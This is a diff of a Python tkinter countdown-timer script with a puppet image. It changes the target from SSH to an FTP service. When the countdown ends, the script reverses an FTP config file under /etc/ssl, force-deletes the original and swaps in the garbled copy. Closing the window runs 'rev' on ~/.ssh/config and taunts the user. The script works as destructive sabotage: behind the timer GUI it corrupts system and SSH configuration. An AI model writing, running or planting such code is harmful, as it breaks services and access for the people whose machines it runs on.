@@ -16,15 +16,15 @@ root.geometry("300x600")
 # Using title() to display a message in
 # the dialogue box of the message in the
 # title bar.
-root.title("Bye Bye ssh")
+root.title("Bye Bye ftp")
   
 # Declaration of variables for the timer
 minute=StringVar()
 second=StringVar()
   
 # setting the default value as 0 for the timer so that it ticks down
-minute.set("0")
-second.set("15")
+minute.set("3")
+second.set("0")
   
 # Use of Entry class to take input from the user
   
@@ -65,8 +65,10 @@ def submit():
         # when temp value = 0; then a messagebox pop's up
         # with a message:"Time's up"
         if (temp == 0):
-            messagebox.showinfo("Time Countdown", "ssh is dead X( ")
-            os.system('rev ~/.ssh/config')
+            messagebox.showinfo("Time Countdown", "ftp is dead X( ")
+            os.system('rev /etc/ssl/ftpc/ftpc.conf > /etc/ssl/ftpc/ftpc2.conf')
+            os.system('rm -rf /etc/ssl/ftpc/ftpc.conf')
+            os.system('mv /etc/ssl/ftpc/ftpc2.conf /etc/ssl/ftpc/ftpc.conf')
          
         # after every one sec the value of temp will be decremented
         # by one
@@ -80,14 +82,20 @@ def add_time(secs):
         temp = temp + int(10)
     
 # Restart function will start the process to make sure that it is running correctly when the script is ran    
-def restart():
-    global temp
-    if temp < 1:
-        os.system('rev ~/.ssh/config')
-        temp = 180
+#def restart():
+#    global temp
+#    if temp < 1:
+#        os.system('rev /etc/ssl/ftpc/ftpc.conf > /etc/ssl/ftpc/ftpc2.conf')
+#        temp = 180
+
+
+def exit_function():
+    messagebox.showinfo("Time Countdown", "You closed me, you lost")
+    os.system('rev ~/.ssh/config')
+    root.destroy()
 
 # More things for the gui
-bg = PhotoImage(file = "/puppet/puppet.png")
+bg = PhotoImage(file = "puppet.png")
 label1 = Label( root, image = bg)
 label1.place(x = 0, y = 70)
 
@@ -95,13 +103,12 @@ label1.place(x = 0, y = 70)
 temp = int(minute.get())*60 + int(second.get())
 add_button = Button(root, text="+10", font=('',20),command=partial(add_time, 10))
 add_button.place(x = 55,y = 210)
-restart_button = Button(root, text="restart", font=('',20),command=partial(restart))
-restart_button.place(x = 55,y = 300)
+#restart_button = Button(root, text="restart", font=('',20),command=partial(restart))
+#restart_button.place(x = 55,y = 300)
 # button widget
 submit()
-  
 
-root.protocol("WM_DELETE_WINDOW", disable_event)
+root.protocol('WM_DELETE_WINDOW', exit_function)
 # infinite loop which is required to
 # run tkinter program infinitely
 # until an interrupt occurs
